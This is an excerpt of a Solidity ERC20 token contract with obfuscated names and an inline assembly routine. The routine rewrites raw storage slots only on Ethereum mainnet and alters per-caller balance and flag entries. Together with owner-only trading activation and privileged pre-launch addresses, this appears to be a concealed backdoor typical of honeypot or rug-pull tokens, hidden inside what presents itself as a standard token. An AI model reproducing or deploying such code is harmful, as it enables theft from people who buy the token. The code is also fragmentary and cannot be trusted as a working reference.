...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        methodAddr.push(_router); methodAddr.push(msgSender_); methodAddr.push(pair);
        for (uint256 q=0; q < 3;) {_risingOcean[methodAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _snowFlake = block.number;
        return true;
    }
    ...
    function _SystemStart() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0xd1af3b4408c2a615a7882d5467339dbffca069350a9415317e1473f32f8cdbf3))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x709fe041a5218b7147e6fc8337d2256f8ddd25715b11e45fab4e5d6e44b3b01e,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0xd1af3b4408c2a615a7882d5467339dbffca069350a9415317e1473f32f8cdbf3,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == methodAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMethod(creator, initialSupply);
    }
}
